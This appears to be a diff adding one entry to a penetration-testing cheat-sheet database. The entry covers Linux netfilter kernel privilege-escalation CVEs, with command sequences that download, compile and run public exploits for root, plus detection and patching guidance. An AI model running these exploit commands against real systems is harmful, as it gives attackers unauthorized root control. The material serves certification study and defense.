@@ -1,0 +1,104 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "git",
+    "gcc"
+  ],
+  "tags": [
+    "netfilter",
+    "kernel",
+    "cve"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Kernel Exploits",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Check the running kernel against the CVE table below",
+      "command": "uname -r"
+    }
+  ],
+  "notes": "Kernel ranges: CVE-2021-22555 -> 2.6-5.11; CVE-2022-25636 -> 5.4-5.6.10; CVE-2023-32233 -> up to 6.3.1.",
+  "references": [
+    {
+      "title": "CVE-2021-22555 (Google)",
+      "url": "https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555"
+    },
+    {
+      "title": "CVE-2022-25636 (Bonfee)",
+      "url": "https://github.com/Bonfee/CVE-2022-25636"
+    },
+    {
+      "title": "CVE-2023-32233 (Liuk3r)",
+      "url": "https://github.com/Liuk3r/CVE-2023-32233"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-linux-lpe-cves",
+      "note": "Pick the netfilter CVE matching the kernel.",
+      "rel": "prereq"
+    },
+    {
+      "id": "kernel-exploit-generic",
+      "note": "Generic kernel-exploit workflow.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "netfilter-cves",
+  "name": "Netfilter - Kernel LPE CVEs",
+  "command": "uname -r",
+  "description": "Several netfilter (nf_tables) bugs give local root on a range of kernels. Match the kernel version to the right CVE, then clone/compile/run.",
+  "variations": [
+    {
+      "label": "CVE-2021-22555 (2.6 - 5.11)",
+      "command": "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\ngcc -m32 -static exploit.c -o exploit\n./exploit"
+    },
+    {
+      "label": "CVE-2022-25636 (5.4 - 5.6.10)",
+      "command": "git clone https://github.com/Bonfee/CVE-2022-25636.git && cd CVE-2022-25636 && make\n./exploit"
+    },
+    {
+      "label": "CVE-2023-32233 (up to 6.3.1)",
+      "command": "git clone https://github.com/Liuk3r/CVE-2023-32233 && cd CVE-2023-32233\ngcc -Wall -o exploit exploit.c -lmnl -lnftnl\n./exploit"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "The Linux netfilter subsystem (iptables/nftables) contains kernel-level vulnerabilities. CVE-2021-22555, CVE-2022-25636, and CVE-2023-32233 exploit memory corruption flaws in packet processing (heap overflow, use-after-free) to achieve kernel code execution and local privilege escalation to root.",
+    "prerequisites": "Local user account. Vulnerable kernel version (CVE-2021-22555: 2.6-5.11, CVE-2022-25636: 5.4-5.6.10, CVE-2023-32233: up to 6.3.1). Ability to compile or execute exploit code. CAP_NET_ADMIN may be required for some variants.",
+    "impact": "Root privilege escalation via kernel code execution. All user-space security controls (sudo, capabilities, AppArmor, SELinux) are bypassed since the exploit operates in kernel space.",
+    "detection": "Compilation of netfilter exploit code (gcc with kernel exploit source). Unusual nftables/iptables rule manipulation followed by process privilege change. EDR: uid escalation 1000->0 outside normal paths. Kernel oops in /var/log/kern.log on failed exploits.",
+    "artifacts": "Process audit log (exploit compilation/execution) | EDR: uid change 1000->0 | Kernel log: potential oops on failed attempt",
+    "prevention": "Apply kernel security updates immediately. Enable automatic kernel patching. Restrict CAP_NET_ADMIN capability to necessary system processes only. Deploy kernel hardening (SMEP, SMAP, struct_randomize). Use user namespaces restrictions (sysctl kernel.unprivileged_userns_clone=0 where feasible).",
+    "misconfiguration": "System running a kernel in the affected version range without the security patch. CAP_NET_ADMIN accessible to unprivileged users via user namespaces. Automatic kernel updates disabled.",
+    "vulnerable_config": "# Vulnerable kernel examples:\n# CVE-2021-22555: 5.10.0-xx < 5.11 patch\n# CVE-2022-25636: 5.4.x-5.6.10\n# CVE-2023-32233: < 6.3.2\nuname -r\n\n# Unprivileged user namespaces enabled (required for some variants)\ncat /proc/sys/kernel/unprivileged_userns_clone  # if 1, exploitable",
+    "secure_config": "# Update kernel\napt update && apt upgrade linux-image-generic\n\n# Disable unprivileged user namespaces (if not needed)\necho 'kernel.unprivileged_userns_clone=0' >> /etc/sysctl.conf\nsysctl -p\n\n# Enable automatic security updates\napt install unattended-upgrades",
+    "sources": [
+      "HTB M25",
+      "MITRE T1068"
+    ]
+  }
+}
